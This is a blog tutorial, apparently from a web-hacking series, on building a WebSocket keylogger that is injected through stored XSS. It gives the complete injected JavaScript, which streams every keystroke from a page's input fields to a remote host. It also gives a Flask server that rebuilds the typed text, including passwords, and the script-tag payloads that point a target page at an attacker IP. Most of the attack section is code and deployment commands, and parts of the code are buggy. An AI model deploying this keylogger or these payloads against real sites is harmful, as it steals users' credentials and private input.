---
layout: post
title: XSS Session Hijacking Part II
categories:
- web hacking
- owasp top 10
---

In Part I of this series, we learned how to create two modern cookie stealers for stealthily carrying out session hijacking attacks. Although highly effective in many cases, both cookie stealers are useless against websites that employ HttpOnly session cookies.

In this tutorial, we're not going to be focusing on stealing sessions. Instead, we're going to learn how to log keystrokes in realtime using WebSockets, as well as map keystrokes to specific DOM elements.

> WebSockets is an advanced technology that makes it possible to open an interactive communication session between the user's browser and a server. With this API, you can send messages to a server and receive event-driven responses without having to poll the server for a reply.
> -- [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API)


As the previous tutorial, we're going to be using Python and Flask on the backend as well as JavaScript on the frontend. Additionally, we're going to be using Flask-SocketIO and gevent on our server. For a solid overview of how to use WebSockets with Flask, check out this [awesome post by Miguel Grinberg](http://blog.miguelgrinberg.com/post/easy-websockets-with-flask-and-gevent).


# Project Setup

Let's start out by creating our project directory structure. We'll also create blank versions of the files we'll be creating later.

	mkdir -p keylogger/templates
	touch keylogger/run.py keylogger/tables.py keylogger/templates/wsk.js

Our project directory structure should now look like this:

	keylogger/
		run.py
		tables.py
		templates/
			wsk.js

Next we create and activate a virtual environment within our main project directory.

	cd keylogger
	virtualenv env
	. env/bin/activate

We then create a requirements file containing our project's dependencies.

	printf "flask\nnumpy\nflask-socketio" > pip.req

Finally, we install all dependencies enumerated in our pip.req file.

	pip install -r pip.req

# WebSockets frontend

Now that are project has been setup, we can start coding the keylogger's frontend. The keylogger frontend is the JavaScript code that will be injected into the target page to send keystrokes back to our server. This code should go in the following file:

	keylogger/templates/wsk.js

We start out by creating our onload function. This function will initialize our keylogger everytime the infected page is loaded. Our onload function starts out by getting a list of every input tag on the target page. It then adds an event listener to each one, passing logKeystroke as a callback. Our logKeystroke function, the callback, gets executed everytime a 'keydown' event occurs. We will define it later in this tutorial. We then set our WebSockets namespace and initiate a WebSocket connection with the server. Finally, we set up an event handler for 'connect' events emitted from the server.

{% highlight javascript %}

	window.onload = function() {

		all_inputs = document.getElementsByTagName('input');

		for (var i = 0, length = all_inputs.length; i < length; i++) {
	
			element.addEventListener("keydown", logKeystroke);
		}

		namespace = '/keylogger';
{% raw %} 
		socket = io.connect('http://' + '{{ lhost }}' + ':' + '{{ lport }}' + namespace);
{% endraw %}

    	// event handler for new connections
    	socket.on('connect', function() {
    	    socket.emit({ data : 'new connection initiated'});
    	});
	}

{% endhighlight %}

The following syntax belongs to a templating engine called Jinja.

{% raw %} 

	{{ lhost }}
	{{ lport }}

{% endraw %}

Jinja allows us to define variables from our backend Python code and use them within our HTML template. The lhost and lport variables will be defined at runtime within our backend code.

##Logging Keystrokes

Next we define our logKeystroke function. The logKeystroke function takes a single parameter, event, which represents the event of a key being depressed on the keyboard. We grab the keyCode from the event, and send it back to the server along with other information about the context in which the keystroke occurred.
	
{% highlight javascript %}

function logKeystroke(event) {

	var c = event.keyCode || event.keyCode;

	socket.emit('keydown', {
		'ks' : c,
		'start_pos' : this.selectionStart,
		'end_pos' : this.selectionEnd,
		'shift' : event.shiftKey,
		'alt' : event.altKey,
		'ctrl' : event.ctrlKey,
		'name' : this.getAttribute('name'),
		'type' : this.getAttribute('type'),
		'id' : this.getAttribute('id'),
		'class' : this.getAttribute('class'),
	});
}
{% endhighlight %}

The contextual information that we provide incudes:

 - __shift__ - a boolean that is True when the shift key is pressed, False when it is not
 - __ctrl__ - just like shift, but for the control key
 - __alt__ - just like shift and ctrl, but for the alt key 
 - __name__ - the input's name attribute
 - __type__ - the input's type attribute
 - __id__ - the input's id, if any
 - __class__ - the input's class, if any 
 - __start\_pos and end\_pos__ - see subsection below

##start\_pos and end\_pos

We not only want to know what key was pressed, but where the cursor was located when the keypress occured. Say the user has the following text already written into an input field:

	the quick brown fox jumps over the lazy doge
	
If the user's cursor is located at the end of the string, and the user  hits the 'a' key with the shift key depressed, then the text should be updated to look like this: 
		the quick brown fox jumps over the lazy dogeA
	
Otherwise if the user's cursor is located at the beginning of the string, the text should look like this:

		Athe quick brown fox jumps over the lazy doge
		
Otherwise if the user's cursor is located immediately after the 'x' in the word fox, then the string should be updated to look like this:

		the quick brown foxA jumps over the lazy doge
		
Finally, we need to deal with the case in which the user has highlighted a portion of the text. Say the user has highlighted the word "quick" and then types the letter 'a' with the shift key pressed. then the text should be updated to look like this:

		the A brown fox jumps over the lazy doge

Fortunately, it's actually relatively simple to account for all of these cases. Each keypress event has both 'selectionStart' and 'selectionEnd' attributes that corresponds to the start and end indexes of the text the user has selected. If the user has no text selected, then the 'selectionStart' and 'selectionEnd' attributes are both set to the position of the cursor. 


The complete wsk.js file should look like this:

{% highlight javascript %}

	function logKeystroke(event) {
	    
		var c = event.keyCode || event.keyCode;
	        
		socket.emit('keydown', {
			'ks' : c,
			'start_pos' : this.selectionStart,
			'end_pos' : this.selectionEnd,
			'shift' : event.shiftKey,
			'alt' : event.altKey,
			'ctrl' : event.ctrlKey,
			'name' : this.getAttribute('name'),
			'type' : this.getAttribute('type'),
			'id' : this.getAttribute('id'),
			'class' : this.getAttribute('class'),
		});
	}

	window.onload = function() {

		all_inputs = document.getElementsByTagName('input');

		for (var i = 0, length = all_inputs.length; i < length; i++) {
	
			element.addEventListener("keydown", logKeystroke);
		}

		namespace = '/keylogger';
{% raw %} 
		socket = io.connect('http://' + '{{ lhost }}' + ':' + '{{ lport }}' + namespace);
{% endraw %}

    	// event handler for new connections
    	socket.on('connect', function() {
    	    socket.emit({ data : 'new connection initiated'});
    	});
	}


{% endhighlight %}

#Keycode lookup table

With our frontend out of the way, it's time to start thinking about how to put together our serverside code. Our first task on the backend is to create a system that efficiently translates numerical keycodes and shift combinations into readable characters. To do this, we use a lookup table system that we will implement in the following file:

	keylogger/tables.py

Each key on the keyboard maps to a unique keycode. In order to make sense of what the user is typing, we need to map this keycode to a printable character. To do this, we simply use a lookup table like the one shown below. Each numerical keycode is treated as an index to the NumPy array, at which the keycode's corresponding printable character is stored. We use a NumPy array to get a true O(1) lookup time for each character. Since the lookup table is pretty long, the greater portion of the table is not shown. However, you can see it in the full source code included at the end of this tutorial.

{% highlight python %}

	import numpy

	keyboard = numpy.array([
	  "",
	  "",
	  "", 
	  "CANCEL", 
	  "",
	  "", 
	  "HELP", 
	  "", 
	  "BACK_SPACE", 
	  "TAB", 
	  "", 
	  "", 
	  "CLEAR", 
	  "ENTER", 
	  "ENTER_SPECIAL", 
	  "", 
	  "SHIFT", 
	  "CONTROL", 
	  "ALT", 
	
		.
		.
		.
	
	  "WIN_OEM_CLEAR",
	  "",
	])

{% endhighlight %}

Simply mappinge each keycode to a character is not enough. Since each keycode may represent a different character depending on whether or not the shift key is pressed, we need to define a second lookup table that maps each character on the keyboard to its alt character, provided the character has one.

{% highlight python %}

	shift = {
	    '1' : '!',
	    '2' : '@',
	    '3' : '#',
	    '4' : '$',
	    '5' : '%',
	    '6' : '^',
	    '7' : '&',
	    '8' : '*',
	    '9' : '(',
	    '0' : ')',
	    '-' : '_',
	    '=' : '+',
	    '[' : '{',
	    ']' : '}',
	    '\\': '|',
	    ';' : ':',
	    '\'': '"',
	    ',' : '<',
	    '.' : '>',
	    '/' : '?',
	    '`' : '~',
	}

{% endhighlight %}

Finally, we add a function that checks to see if a keycode maps to a printable character.

{% highlight python %}

	def is_printable(ks):
	    return any([
	        ks == 8,
	        ks == 32,
	        ks == 46,
	        (ks >= 219 and ks <= 222),
	        (ks >= 186 and ks <= 191),
	        (ks >= 64 and ks <=  90),
	        (ks >= 48 and ks <=  59),
	    ])

{% endhighlight %}

The complete tables.py pretty long, but if you want to check out the whole thing it's included with the source code at the end of the tutorial.

# WebSockets backend

With our frontend and lookup tables complete, it's time to write the backend code for our keylogger's server component. Let's start by opening the following file.

	keylogger/run.py

We first add our import statements to the top of the file.

{% highlight python %}

	import logging
	import tables
	
	from flask import Flask, make_response, render_template, request
	from flask.ext.socketio import SocketIO, emit

{% endhighlight %}

We then set two global variables, __LHOST__ and __LPORT__, that are used to configure the script. The user should set LHOST to his or her server's fqdn or IP address, and LPORT to the port on which the keylogger server should be run.

{% highlight python %}

	LHOST = '192.168.1.90'
	LPORT = 80

{% endhighlight %}

Flask normally sends a lot of output to stdout. This is an awesome feature for debugging a web application. However, we want stdout to be reserved for displaying keystrokes. To do this, we use Python's logging module to send all log output to a logfile.

{% highlight python %}

logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)

{% endhighlight %}

We then instantiate our Flask application, patch it with Flask-CORS, and then use it to create a new SocketIO object. We also create a global dictionary, __input_tags__, that will be used to keep track of the current state of every input tag on the target page.

{% highlight python %}

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app)

input_tags = {}

{% endhighlight %}
	
We then define a route for our index page. Our index is tasked with handling requests for our keylogging JavaScript file. As previously mentioned, the JavaScript file is built dynamically using the Jinja templating engine. The values of lhost and lport are passed in from our Python code, and set to the corresponding global variables that we placed at the top of the file. 

{% highlight python %}

	@app.route('/')
	def index():
	
		jsfile = render_template('wsk.js', lhost=LHOST, lport=LPORT)
		response = make_response(jsfile)
		response.headers['Content-Type'] = 'application/javascript'
		return response
		
{% endhighlight %}

We next define functions to handle new and terminating connections.

{% highlight python %}

@socketio.on('connect', namespace='/keylogger')
def test_connect():

    emit('confirm connection', { 'data' : 'Connected' })
	
@socketio.on('disconnect', namespace='/keylogger')
def test_disconnect():
    print 'Client disconnected'

{% endhighlight %}

The majority of the work done by the keylogger's backend will occur in the keydown function. The keydown function is triggered when the client emits a keydown event. The function's only argument, __message__, contains the data sent from the client. We use message to set our function's local variables.

{% highlight python %}

@socketio.on('keydown', namespace='/keylogger')
def keydown(message):

    keystroke = message['data']['ks']
    ctrl_pressed = message['data']['ctrl']
    alt_pressed = message['data']['alt']
    shift_pressed = message['data']['shift']
    selection_start = message['data']['start_pos']
    selection_end = message['data']['end_pos']
	name = message['data']['name']

{% endhighlight %}
	
We use the input tag's name attribute to identify what field the user is typing into. There are far more accurate and reliable ways of doing this. However, we avoid using them for the sake of keeping this tutorial straightforward. We first check to see if the name is already in our input_tags dictionary. If it is not, then we add a new entry to the dictionary such that the name of the input tag maps to an empty list. This list will later contain the contents of the input field the user is typing into. We then set a variable 'contents' to point to the list mapped to by the name attribute. When 'contents' is modified, input_tags[name] will be modified as well.

{% highlight python %}

	if name not in input_tags:
		input_tags[name] = []
	contents = input_tags[name]

{% endhighlight %}
	
We then check to see if either the control or alt keys have been pressed, or if the key does not correspond to a printable character. If any of these conditions are true, then keydown returns immediately, as the keystroke does not correspond to text input from the user.

{% highlight python %}

    if ctrl_pressed or alt_pressed or not tables.is_printable(keystroke):
        return

{% endhighlight %}

The keystroke is then mapped to a preliminary character using our keyboard lookup table. We say the character is preliminary because its value may need to be changed if the shift key has been pressed.

{% highlight python %}

    keystroke = tables.keyboard[keystroke]

{% endhighlight %}

We then check to see if the preliminary character is a backspace. If the character is a backspace, we either delete any text the user has highlighted or delete the character immediately preceding the user's cursor.

{% highlight python %}

    if keystroke == 'BACK_SPACE':

        if selection_start == selection_end and selection_start != 0:
            contents.pop(selection_start-1)
        else:
            del contents[selection_start:selection_end]

{% endhighlight %}

If the character is not a backspace, we check to see if the delete key has been pressed. If it has, we either delete any highlighted text or delete the character immediately following the user's cursor.

{% highlight python %}

    elif keystroke == 'DELETE':

        if selection_start == selection_end and selection_end != len(contents):
            contents.pop(selection_start)
        else:
            del contents[selection_start:selection_end]

{% endhighlight %}
			
If neither the backspace or delete key have been pressed, we assume that the preliminary keystroke represents a printable character. We then check to see if the shift key has been pressed and, if it has, modify the keystroke accordingly. Lowercase letters become uppercase, numbers become symbols, and so on and so forth. If the user has any text highlighted, we delete it. We then insert the finalized keystroke at the current cursor position. The updated contents of the input field is saved for use with the next keystroke.

{% highlight python %}

    else:
        
        if shift_pressed:

            if keystroke in tables.shift:
                keystroke = tables.shift[keystroke]
            elif keystroke.isalpha():
                keystroke = keystroke.upper()

        if selection_start != selection_end:
            del contents[selection_start:selection_end]

        contents.insert(selection_start, keystroke)

{% endhighlight %}

We then print the current contents of the input field to the console.

{% highlight python %}

    print '<input id="%s" type="%s" class="%s" name="%s" /> textval: %s' %\
            (message['id'],
            message['type'],
            message['class'],
            message['name'],
            ''.join(contents))

{% endhighlight %}
		
Finally, at the bottom of our file, we call socketio.run() to start our keylogger server.

{% highlight python %}

if __name__ == '__main__':

    socketio.run(app, host='0.0.0.0', port=LPORT)

{% endhighlight %}

The completed run.py file should look like this:

{% highlight python %}

import logging
import tables

from flask import Flask, make_response, render_template, request
from flask.ext.socketio import SocketIO, emit

LHOST = '192.168.1.169'
LPORT = 80

logging.basicConfig(filename='wskeylogger.log', level=logging.INFO)

app = Flask(__name__)
#CORS(app)
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app)

input_tags = {}

@app.route('/')
def index():

    jsfile = render_template('wsk.js', lhost=LHOST, lport=LPORT)
    response = make_response(jsfile)
    response.headers['Content-Type'] = 'application/javascript'
    return response

@socketio.on('connect', namespace='/keylogger')
def test_connect():

    emit('confirm connection', { 'data' : 'Connected' })
    
@socketio.on('disconnect', namespace='/keylogger')
def test_disconnect():
    print 'Client disconnected'


@socketio.on('keydown', namespace='/keylogger')
def keydown(message):

    keystroke = message['ks']
    ctrl_pressed = message['ctrl']
    alt_pressed = message['alt']
    shift_pressed = message['shift']
    selection_start = message['start_pos']
    selection_end = message['end_pos']
    name = message['name']

    if name not in input_tags:
        input_tags[name] = []
    contents = input_tags[name]

    if ctrl_pressed or alt_pressed or not tables.is_printable(keystroke):
        return

    keystroke = tables.keyboard[keystroke]

    if keystroke == 'BACK_SPACE':

        if selection_start == selection_end and selection_start != 0:
            contents.pop(selection_start-1)
        else:
            del contents[selection_start:selection_end]

    elif keystroke == 'DELETE':

        if selection_start == selection_end and selection_end != len(contents):
            contents.pop(selection_start)
        else:
            del contents[selection_start:selection_end]
    else:
        
        if shift_pressed:

            if keystroke in tables.shift:
                keystroke = tables.shift[keystroke]
            elif keystroke.isalpha():
                keystroke = keystroke.upper()

        if selection_start != selection_end:
            del contents[selection_start:selection_end]

        contents.insert(selection_start, keystroke)

    print '<input id="%s" type="%s" class="%s" name="%s" /> textval: %s' %\
            (message['id'],
            message['type'],
            message['class'],
            message['name'],
            ''.join(contents))
    
if __name__ == '__main__':

    socketio.run(app, host='0.0.0.0', port=LPORT)

{% endhighlight %}

# Running the Keylogger

The first step to using our keylogger is to inject the WebSockets source code into the target page. For testing purposes, we can use the stored XSS page on DVWA that we used in Part I of this series.

	<script type="text/javascript" src="http://cdnjs.cloudflare.com/ajax/libs/socket.io/1.3.5/socket.io.min.js"></script>

We then inject a script tag linking to our keylogger's frotnend code. Just substitute 192.168.1.99 with your IP address, and 80 with the value of LPORT in your run.py file.

	<script type="text/javascript" src="http://192.168.1.99:80/"></script>

In your __keylogger__ directory, run the following command:

	python run.py

Finally, refresh the page you injected the script tags into. Try typing into one of the input fields. You should get something similar to the output shown below in your terminal.

![logging keystrokes]({{ site.baseurl }}images/wsk/logging-ks.png)

We can now see what and where the user is typing. 

To check out the source code for this tutorial, head to [github.com/s0lst1c3/keylogger](http://github.com/s0lst1c3/keylogger). For a more robust example designed to be used in an actual pentesting scenario, check out my project [keyboardsnitch](http://github.com/s0lst1c3/keyboardsnitch).


